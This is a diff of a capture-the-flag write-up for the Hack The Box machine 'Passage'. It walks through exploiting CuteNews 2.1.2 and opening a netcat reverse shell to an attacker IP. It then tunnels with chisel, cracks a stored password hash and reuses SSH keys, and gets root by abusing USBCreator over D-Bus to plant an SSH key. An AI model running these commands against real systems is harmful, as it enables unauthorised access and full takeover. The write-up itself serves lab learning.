@@ -1,5 +1,5 @@
+##### port scan
 `nmap -p- -sSCV 10.129.8.47  --min-rate 999`
-``
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
@@ -13,10 +13,11 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-
+#### port 80 enum
 http://10.129.8.47/CuteNews/ - Powered by [CuteNews 2.1.2](http://cutephp.com/cutenews/)
 
-https://www.exploit-db.com/exploits/48800
+vuln found on this app
+> https://www.exploit-db.com/exploits/48800
 
 ` python3 48800.py`
 
@@ -27,27 +28,33 @@ Dropping to a SHELL
 command > id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-
+to get a full shell
 `command > nc 10.10.16.47 4444 -e /bin/bash`
 
-python -c 'import pty;pty.spawn("/bin/bash")'
+`python -c 'import pty;pty.spawn("/bin/bash")'`
 
-tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -  
+check the port listening on host
+`tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN    `
 
-
+use chisel to create tunnel, for attack host to access target port 631
 http://127.0.0.1:631/ru
+on target host
+`www-data@passage:/tmp$ ./chisel server --port 8001`
 
-www-data@passage:/tmp$ ./chisel server --port 8001
+```
 ./chisel server --port 8001
 2025/12/24 23:35:41 server: Fingerprint VpKvi02CiIzKHH9TU8tAy3v2siyLYiOkgC8seCljBo4=
 2025/12/24 23:35:41 server: Listening on http://0.0.0.0:8001
 2025/12/24 23:37:04 server: session#1: Client version (1.11.3-0kali1) differs from server version (1.11.3)
 2025/12/24 23:37:11 server: session#2: Client version (1.11.3-0kali1) differs from server version (1.11.3)
-
-└─$ chisel client 10.129.8.47:8001 631:localhost:631
+```
+on kali
+`└─$ chisel client 10.129.8.47:8001 631:localhost:631`
+```
 2025/12/25 18:37:09 client: Connecting to ws://10.129.8.47:8001
 2025/12/25 18:37:09 client: tun: proxy#631=>localhost:631: Listening
 2025/12/25 18:37:10 client: Connected (Latency 91.189883ms)
+```
 
 `└─$ sudo dirsearch -u http://127.0.0.1:631  `
 ```
@@ -63,33 +70,18 @@ www-data@passage:/tmp$ ./chisel server --port 8001
 [18:45:02] 403 -  342B  - /remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
 [18:45:03] 200 -  901B  - /robots.txt
 [18:45:04] 200 -    3KB - /ru
-
 ```
 
 `www/html/CuteNews/cdata/users$ cat /etc/passwd | grep bash`
+```
 <tml/CuteNews/cdata/users$ cat /etc/passwd | grep bash                       
 root:x:0:0:root:/root:/bin/bash
 nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
 paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
- 
-└─$ hash-identifier 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
-   #########################################################################
-   #     __  __                     __           ______    _____           #
-   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
-   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
-   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
-   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
-   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
-   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
-   #                                                             By Zion3R #
-   #                                                    www.Blackploit.com #
-   #                                                   Root@Blackploit.com #
-   #########################################################################
---------------------------------------------------
+```
+#### lateral move
 
-Possible Hashs:
-[+] SHA-256
-[+] Haval-256
+under /var/www/html/CuteNews/cdata/users some php files
 
 
 `cat b0.php`
@@ -103,10 +95,17 @@ YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIx
 ```
 a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}} 
 ```
-
+`└─$ hash-identifier 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
 ```
-e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+```
 
+use hashcat to crack the credential,  bcrypt
+
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
+```
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 1400 (SHA2-256)
@@ -178,3 +177,109 @@ on my acttack machine
 └─$ ssh -i id_rsa paul@10.129.7.226
 paul@passage:~$ 
 ```
+
+under paul .ssh, view the authorized_keys
+`cat authorized_keys `
+```
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
+```
+it is clearly, this pub key is owned by nadav another user in this host
+
+`└─$ ssh -i id_rsa nadav@10.129.6.178`
+```
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
+nadav@passage:~$ id
+uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
+
+this user is in sudo 27 group 
+
+Sudo version 1.8.16
+
+`nadav@passage:~$ cat .viminfo`
+```
+viminfo is mark of vim command
+#File marks:
+'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+
+#Jumplist (newest first):
+-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+
+#History of marks within files (newest to oldest):
+
+> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+	"	12	7
+
+> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+	"	2	0
+	.	2	0
+	+	2	0
+```
+view this 2 files
+`nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf`
+```
+<!DOCTYPE busconfig PUBLIC
+ "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+<busconfig>
+
+  <!-- Only root can own the service -->
+  <policy user="root">
+    <allow own="com.ubuntu.USBCreator"/>
+  </policy>
+
+  <!-- Allow anyone to invoke methods (further constrained by
+       PolicyKit privileges -->
+```
+anyone can invole this, google "USBCreator", find a vuln of it
+> https://gist.github.com/noobpk/a4f0a029488f37939c4df6e20472501d
+
+`└─$ ssh-keygen -t rsa `
+```
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/edi/.ssh/id_rsa): /tmp/key/id_rsa
+Enter passphrase for "/tmp/key/id_rsa" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/key/id_rsa
+Your public key has been saved in /tmp/key/id_rsa.pub
+The key fingerprint is:
+SHA256:Ncv2SVo3Su2ay01jUj+O04DJ1amB6KbuC69mcsmBfeM edi@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|                 |
+|                 |
+|          + . . .|
+|         + + + o |
+|    o   S = B B  |
+|   . o o + X O o |
+|    ..= + . = B..|
+|   . *oE   . Ooo.|
+|    =.+=.   =oo. |
++----[SHA256]-----+
+```                   
+copy new generated pub key to target host under /tmp
+`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuWakc5QHbIWV+6iTdtP+V/AS41p0dxBH128YjrNWFRoCbCM7BhlqVmQ6ddfQb8Pc60XfrsPDpzzZsrliBOXCFn8y4EjrG1jzncCfQAHrORNt1gFOYt0dz3KGX3rujJC4DFwPGamptq/erJh/yjVQvqQtCy1Pu34zsqsFDOVcAV7iaCN1oKFTutHQXfsNABryxgcvgPYRN5qozuNvpsas= edi@kali" > authorized_keys`
+
+involk USBCreator to move new pub key to root/.ssh/
+`nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/authorized_keys /root/.ssh/authorized_keys true `
+
+now be able to ssh as root
+`└─$ ssh -i id_rsa root@10.129.6.178`
+```
+root@passage:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### lesson learned
+- search for application folder for sensitive file or credentials caredfully
+- group on linux - a way to ES
+- .viminfo
